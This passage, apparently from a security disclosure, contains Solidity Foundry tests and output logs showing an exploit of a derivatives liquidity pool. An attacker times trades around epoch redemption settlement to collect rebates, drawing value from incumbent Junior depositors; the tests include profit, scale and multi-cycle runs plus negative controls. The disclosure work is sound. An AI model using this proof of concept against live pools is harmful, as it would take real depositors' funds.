        console2.log(string.concat("[DEPTH_NEUTRAL] GROUP ABSOLUTE LOSS VS DEPOSIT USDG = ", _susdg(int256(grpDep) - int256(grpAtk)), " ; GROUP LOSS VS CONTROL USDG = ", _susdg(int256(grpCtrl) - int256(grpAtk))));
        _kv("DEPTH_NEUTRAL", "incumbent_realized_vs_control_usdg", _susdg(int256(atk.incRealized[0]) - int256(ctrl.incRealized[0])));
        _kv("DEPTH_NEUTRAL", "group_deposited_usdg", _usdg(grpDep));
        _kv("DEPTH_NEUTRAL", "group_realized_attack_usdg", _usdg(grpAtk));
        _kv("DEPTH_NEUTRAL", "group_absolute_loss_usdg", _susdg(int256(grpDep) - int256(grpAtk)));
        _kv("DEPTH_NEUTRAL", "group_loss_vs_control_usdg", _susdg(int256(grpCtrl) - int256(grpAtk)));
        assertGt(atk.incRealized[0], ctrl.incRealized[0], "disclosed: the incumbent gains in this arm, the entrant is the victim");
        assertLt(grpAtk, grpDep, "GROUP ABSOLUTE loss vs deposits");
        assertLt(grpAtk, grpCtrl, "GROUP loss vs control");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 3e6, "conservation within 3 USDG");
    }

    /// @dev Disclosure: a third party reduces skew between the settlement and the attacker's close, so the
    ///      attacker's close does not refund c and the attacker LOSES. The refund is ordering dependent.
    function test_OrderingRisk_Disclosed() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[2] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[2].honestShortDiv = 2;
        cs[1].sizeBps = 9900; // 99% of max skew leaves solvency headroom for the honest SHORT (OpenRevertCode 7)
        cs[2].sizeBps = 9900;
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory base = rs[1];
        Res memory hit = rs[2];
        _printArm("ORDERING control", s, ctrl);
        _printArm("ORDERING uninterrupted attack", s, base);
        _printArm("ORDERING attack with honest SHORT y/2 before the close", s, hit);
        _printCompare("ORDERING_uninterrupted", s, ctrl, base);
        _printCompare("ORDERING_third_party_interposes", s, ctrl, hit);
        console2.log(string.concat("[ORDERING] honest SHORT vpiAccrued (reserve-backed rebate) USDG = ", _susdg(hit.honestVpi)));
        console2.log(string.concat("[ORDERING] ATTACKER NET WHEN A THIRD PARTY REDUCES SKEW FIRST USDG = ", _susdg(hit.attackerNet)));
        _kv("ORDERING_risk", "attacker_net_uninterrupted_usdg", _susdg(base.attackerNet));
        _kv("ORDERING_risk", "attacker_net_interposed_usdg", _susdg(hit.attackerNet));
        _kv("ORDERING_risk", "honest_vpi_accrued_usdg", _susdg(hit.honestVpi));

        assertGt(base.attackerNet, 0, "uninterrupted sandwich profitable");
        assertLt(hit.honestVpi, 0, "honest skew-reducing open received a (reserve-backed) rebate");
        assertLt(hit.attackerNet, 0, "attacker loses when someone else reduces skew first");
    }

    /// @dev Scale: 20M pool (Senior 15M from an EOA, incumbent Junior 5M from two EOAs), attacker f ~ 0.6, one cycle.
    function test_Scale_D20M_S75_f060_RealizedClaims() public {
        Scn memory s = _fund(3_000_000e6, 2_000_000e6, 15_000_000e6);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 7_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 7_500_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("SCALE20M control", s, ctrl);
        _printArm("SCALE20M attack", s, atk);
        _printCompare("SCALE_D20M_S75_f060_1cycle", s, ctrl, atk);

        _commonAttackAsserts(s, ctrl, atk);
        assertGt(atk.fWad, 0.59e18, "f ~ 0.6");
        assertLt(atk.fWad, 0.61e18, "f ~ 0.6");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 5e6, "conservation within 5 USDG");
    }

    /// @dev Scale: eight 3-hour cycles inside ~24 h, then the incumbents (and the Senior LP) realize through claims.
    function test_Scale_D20M_S75_f060_EightCyclesPerDay_RealizedClaims() public {
        Scn memory s = _fund(3_000_000e6, 2_000_000e6, 15_000_000e6);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 8, 7_500_000e6);
        cs[1] = _cfg(Mode.Attack, 8, 7_500_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("DAY20M control", s, ctrl);
        _printArm("DAY20M attack", s, atk);
        for (uint256 i; i < 8; ++i) {
            int256 pnl = atk.cumNet[i] - (i == 0 ? int256(0) : atk.cumNet[i - 1]);
            console2.log(string.concat("[DAY20M] cycle ", vm.toString(i), " : f = ", _f4(atk.cycleF[i]), " ; c USDG = ", _usdg(atk.cycleC[i]), " ; attacker cycle PnL USDG = ", _susdg(pnl)));
            assertGt(pnl, 0, "each cycle profitable");
        }
        console2.log(string.concat("[DAY20M] elapsed seconds for 8 cycles = ", vm.toString(atk.elapsed)));
        _printCompare("SCALE_D20M_S75_f060_8cycles", s, ctrl, atk);
        _kv("SCALE_D20M_S75_f060_8cycles", "elapsed_seconds", vm.toString(atk.elapsed));
        _kv("SCALE_D20M_S75_f060_8cycles", "cumulative_attacker_profit_usdg", _susdg(atk.attackerNet));

        assertLe(atk.elapsed, 24 hours + 30 minutes, "8 cycles fit in ~24h");
        _commonAttackAsserts(s, ctrl, atk);
        assertGt(atk.attackerNet, 0, "cumulative attacker profit > 0");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 20e6, "conservation within 20 USDG");
    }

    /// @dev The close-leg execution fee stays in the pool when the close nets a VPI rebate
    ///      (CfdEnginePlanLib.sol:1059-1068: actionNet < 0 => actionRebateAssets, executionFeeAssets = 0).
    ///      Run at zero oracle confidence so prices equal the mark and the fee arithmetic is exact.
    function test_CloseFeeRouting() public {
        confE8 = 0;
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[0].victimsExit = false;
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[1].victimsExit = false;
        cs[1].honestShortDiv = 1; // control: honest SHORT of equal size first => the attacker's close is skew-increasing
        Res[] memory rs = _arms(s, cs);
        Res memory a = rs[0];
        Res memory b = rs[1];

        uint256 fee = a.notional * 4 / 10_000; // 4 bps execution fee on one leg
        console2.log(string.concat("[FEE] notional USDG = ", _usdg(a.notional), " ; one-leg execution fee (4 bps) USDG = ", _usdg(fee)));
        console2.log(string.concat("[FEE] ARM A rebate close: treasury delta at OPEN USDG = ", _usdg(a.treasuryOpenDelta), " ; at CLOSE USDG = ", _usdg(a.treasuryCloseDelta), " ; total = ", _usdg(a.treasuryDelta)));
        console2.log(string.concat("[FEE] ARM A close preview: vpiDelta USDG = ", _susdg(a.pvVpiDelta), " ; executionFeeAssets (preview) USDG = ", _usdg(a.pvFee)));
        console2.log(string.concat("[FEE] ARM A trader clearinghouse delta at close USDG = ", _susdg(a.traderCloseDelta), " ; pool cash delta at close USDG = ", _susdg(a.poolCashCloseDelta)));
        console2.log(string.concat("[FEE] ARM B control (skew-increasing close): treasury delta at CLOSE USDG = ", _usdg(b.treasuryCloseDelta)));
        _kv("FEE_close_routing", "one_leg_fee_usdg", _usdg(fee));
        _kv("FEE_close_routing", "treasury_delta_open_usdg", _usdg(a.treasuryOpenDelta));
        _kv("FEE_close_routing", "treasury_delta_close_usdg", _usdg(a.treasuryCloseDelta));
        _kv("FEE_close_routing", "treasury_delta_total_usdg", _usdg(a.treasuryDelta));
        _kv("FEE_close_routing", "trader_close_delta_usdg", _susdg(a.traderCloseDelta));
        _kv("FEE_close_routing", "pool_cash_close_delta_usdg", _susdg(a.poolCashCloseDelta));
        _kv("FEE_close_routing", "control_treasury_delta_close_usdg", _usdg(b.treasuryCloseDelta));

        assertGt(fee, 0, "fee > 0");
        assertEq(a.treasuryOpenDelta, fee, "open leg: treasury credited the full execution fee");
        assertEq(a.treasuryCloseDelta, 0, "close leg (rebate): treasury credited 0");
        assertEq(a.treasuryDelta, fee, "treasury delta over the whole attack == open-leg fee only");
        // the rebate paid to the trader is net of the fee the pool keeps
        assertLt(a.poolCashCloseDelta, 0, "pool pays the net rebate");
        assertEq(-a.poolCashCloseDelta, a.traderCloseDelta, "pool outflow == trader inflow (nothing leaks to treasury)");
        assertApproxEqAbs(a.traderCloseDelta, -a.pvVpiDelta - int256(fee), 1e6, "trader receives refund - close fee (carry <= 1 USDG)");
        // control: the same close, when it nets a CHARGE instead of a rebate, credits the treasury the fee
        assertEq(b.treasuryCloseDelta, fee, "control: charge close credits the treasury the full fee");
    }

    /// @dev Optional scale: 50M pool at the release 80% Senior cap (Senior 40M, incumbent Junior 10M), attacker f ~ 0.6.
    ///      Any part of the redemption that the Junior ratio cap leaves queued is valued at NAV in the attacker's net
    ///      (stuckValue).
    function test_Scale_D50M_S80cap_f060_RealizedClaims() public {
        Scn memory s = _fund(6_000_000e6, 4_000_000e6, type(uint256).max);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 15_000_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 15_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("SCALE50M control", s, ctrl);
        _printArm("SCALE50M attack", s, atk);
        _printCompare("SCALE_D50M_S80cap_f060_1cycle", s, ctrl, atk);
        console2.log(string.concat("[SCALE50M] stuck (covenant-queued) shares valued: control = ", _usdg(ctrl.stuckValue), " ; attack = ", _usdg(atk.stuckValue)));
        _kv("SCALE_D50M_S80cap_f060_1cycle", "stuck_value_control_usdg", _usdg(ctrl.stuckValue));
        _kv("SCALE_D50M_S80cap_f060_1cycle", "stuck_value_attack_usdg", _usdg(atk.stuckValue));

        assertGt(atk.vpiC, 0, "open must pay positive VPI c");
        for (uint256 i; i < 2; ++i) {
            assertLt(atk.incRealized[i], s.incDep[i], "ABSOLUTE: unprivileged incumbent realized < its own deposit");
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized < no-trade control");
        }
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertGt(atk.attackerNet, ctrl.attackerNet, "attacker net above control");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 10e6, "conservation within 10 USDG");
    }

    /// @dev Sub-majority attacker share (f < 0.43) WITH pre-existing honest same-side skew. An unrelated honest trader
    ///      opens a LONG first (about 0.25 of the pool depth at the attacker's open). The attacker (Junior share f ~ 0.33,
    ///      deposited at fair NAV) then adds more LONG skew within the 0.4 max-skew cap before its matured redemption
    ///      settles, the unrelated keeper settles, and the attacker closes. The control is the identical flow, honest
    ///      trader included, from the same snapshot, with no attacker trade. Honest skew lowers the break-even f because
    ///      every unit the attacker adds is priced at the honest-skew marginal rate: gain f*c with c ~ k*(2*h + y)*y/2 of
    ///      depth against a cost of ~2 x 4 bp of the added notional (the open fee goes to the treasury; the close fee is
    ///      netted against the rebate and stays in the pool after the attacker has already been paid out).
    ///      Disclosure: the loss is measured against the control. The honest trader's fees keep the incumbents above their
    ///      deposit in absolute terms in this arm, so no absolute-loss claim is made here.
    function test_SubMajorityShare_WithHonestSkew_Profitable() public {
        Scn memory s = _fund(1_200_000e6, 800_000e6, 0); // incumbents: 2.0M Junior from two EOAs, no Senior
        uint256 honestSize = (750_000e6 * 1e12) / LOT * LOT; // honest LONG notional 750k
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6); // control: honest LONG present, attacker only does the LP round trip
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        cs[2] = _cfg(Mode.CloseBeforeSettle, 1, 1_000_000e6); // negative control: same open, closed BEFORE the settlement
        for (uint256 i; i < 3; ++i) {
            cs[i].honestSize = honestSize;
        }
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        Res memory neg = rs[2];
        _printArm("SUBMAJ control (honest LONG present, no attacker trade)", s, ctrl);
        _printArm("SUBMAJ attack (honest LONG + attacker LONG, close after settlement)", s, atk);
        _printArm("SUBMAJ neg control (same open, closed before settlement)", s, neg);
        _printCompare("SUBMAJ_f033_honest_skew", s, ctrl, atk);
        _printCompare("SUBMAJ_neg_closed_before_settle", s, ctrl, neg);

        uint256 honestRatio = atk.honestNotional * 1e18 / atk.depthOpen;
        uint256 honestVsIncumbentDepth = atk.honestNotional * 1e18 / _incDepTotal(s);
        uint256 skewTotal = (atk.honestNotional + atk.notional) * 1e18 / atk.depthOpen;
        int256 lossVsCtrl = int256(_incTotal(ctrl)) - int256(_incTotal(atk));
        console2.log(string.concat("[SUBMAJ] f = ", _f4(atk.fWad), " ; honest skew ratio (honest notional / pool depth at attacker open) = ", _f4(honestRatio), " ; c USDG = ", _usdg(atk.vpiC)));
        console2.log(string.concat("[SUBMAJ] honest LONG notional USDG = ", _usdg(atk.honestNotional), " ; attacker LONG notional USDG = ", _usdg(atk.notional), " ; pool depth at open USDG = ", _usdg(atk.depthOpen)));
        console2.log(string.concat("[SUBMAJ] total skew / depth at open = ", _f4(skewTotal), " (cap 0.4000) ; honest notional / incumbent-only depth = ", _f4(honestVsIncumbentDepth)));
        console2.log(string.concat("[SUBMAJ] ATTACKER NET USDG = ", _susdg(atk.attackerNet), " ; control attacker net USDG = ", _susdg(ctrl.attackerNet), " ; neg-control attacker net USDG = ", _susdg(neg.attackerNet)));
        console2.log(string.concat("[SUBMAJ] INCUMBENT LOSS VS CONTROL USDG = ", _susdg(lossVsCtrl), " ; incumbents realized attack = ", _usdg(_incTotal(atk)), " vs control = ", _usdg(_incTotal(ctrl))));
        console2.log(string.concat("[SUBMAJ] honest trader PnL control = ", _susdg(ctrl.honestPnl), " ; attack = ", _susdg(atk.honestPnl), " (the honest trader is not the victim)"));
        _kv("SUBMAJ_f033_honest_skew", "honest_skew_ratio", _f4(honestRatio));
        _kv("SUBMAJ_f033_honest_skew", "total_skew_over_depth", _f4(skewTotal));
        _kv("SUBMAJ_f033_honest_skew", "honest_notional_usdg", _usdg(atk.honestNotional));
        _kv("SUBMAJ_f033_honest_skew", "attacker_notional_usdg", _usdg(atk.notional));
        _kv("SUBMAJ_f033_honest_skew", "attacker_net_neg_control_usdg", _susdg(neg.attackerNet));
        _kv("SUBMAJ_f033_honest_skew", "honest_pnl_control_usdg", _susdg(ctrl.honestPnl));
        _kv("SUBMAJ_f033_honest_skew", "honest_pnl_attack_usdg", _susdg(atk.honestPnl));

        // shape of the scenario
        assertGt(atk.fWad, 0.30e18, "f > 0.30");
        assertLt(atk.fWad, 0.35e18, "f < 0.35 (sub-majority, below the 0.43 no-honest-skew break-even)");
        assertGe(honestRatio, 0.20e18, "honest skew >= 0.20 of depth");
        assertLe(honestRatio, 0.30e18, "honest skew <= 0.30 of depth");
        assertLe(skewTotal, 0.4e18, "total skew within maxSkewRatio");
        assertGt(atk.vpiC, 0, "attacker open pays positive VPI c");
        assertEq(atk.stuckShares, 0, "attacker redemption fully funded");
        // outcome
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertLe(ctrl.attackerNet, 0, "control: LP round trip alone does not profit");
        assertGe(ctrl.attackerNet, -1e6, "control: round-trip rounding only");
        assertApproxEqAbs(ctrl.honestPnl, atk.honestPnl, 1e6, "honest trader is not the victim (within 1 USDG)");
        for (uint256 i; i < 2; ++i) {
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized (attack) < incumbent realized (control)");
        }
        assertLt(_incTotal(atk), _incTotal(ctrl), "incumbents total realized (attack) < control");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 2e6, "conservation within 2 USDG");
        // negative control: identical open closed before the settlement does not profit and does not hurt the incumbents
        assertEq(neg.vpiC, atk.vpiC, "same trade, same c");
        assertLt(neg.attackerNet, 0, "closed before settlement: attacker loses the fees");
        assertGe(_incTotal(neg) + 1e6, _incTotal(ctrl), "closed before settlement: incumbents not harmed");
    }
}
```

### Expected output (trimmed)

```
[MAIN attack] f (attacker share of Junior supply) = 0.4997
[MAIN attack] c (open VPI charge) USDG = 1597.522618 ; notional USDG = 799800.000000
[MAIN attack] attacker NET PnL USDG = 128.283168 ; stuck shares valued = 0.000000
[MAIN attack] trader leg PnL (first cycle, clearinghouse delta) USDG = -680.062942
[MAIN_f050] f = 0.4997 ; c USDG = 1597.522618 ; f*c USDG = 798.362747
[MAIN_f050] LOSS VS CONTROL USDG = 447.957052
[MAIN_f050] attacker NET (attack) USDG = 128.283168 ; attacker NET (control) USDG = -0.009148
[MAIN_f050] redemption uplift vs control USDG = 808.355258
[MAIN_f050] conservation residual (should be ~0) USDG = 0.000000
[SUBMAJ] f = 0.3330 ; honest skew ratio = 0.2497 ; c USDG = 1461.967742
[SUBMAJ] honest LONG notional USDG = 750000.000000 ; attacker LONG notional USDG = 450300.000000
[SUBMAJ] total skew / depth at open = 0.3996 (cap 0.4000)
[SUBMAJ] ATTACKER NET USDG = 107.699532 ; control = -0.006098 ; neg-control = -315.846376
[SUBMAJ] INCUMBENT LOSS VS CONTROL USDG = 288.066887 ; attack = 2000053.648606 vs control = 2000341.715493
[SUBMAJ] honest trader PnL control = -642.127379 ; attack = -641.937807 (the honest trader is not the victim)
[DAY20M] cycle 0 : f = 0.5999 ; c USDG = 21996.500315 ; attacker cycle PnL USDG = 3847.002142
[SCALE_D20M_S75_f060_8cycles] LOSS VS CONTROL USDG = 67463.818349
[SCALE_D20M_S75_f060_8cycles] attacker net delta vs control USDG = 32314.409343
Suite result: ok. 11 passed; 0 failed; 0 skipped
```

### Negative controls in the same file

- **No trade at all:** the incumbent ends whole at 999,999.963440 and the attacker at -0.009148.
- **Same open and close, finished before settlement:** the attacker loses 500.727765 and the incumbent ends 180.426467 above control.
- **Same shape in the sub-majority case:** closed before settlement, the attacker nets -315.846376.

The only difference between the profitable run and the losing run is whether the position is still open when the epoch settles. That is the whole bug.
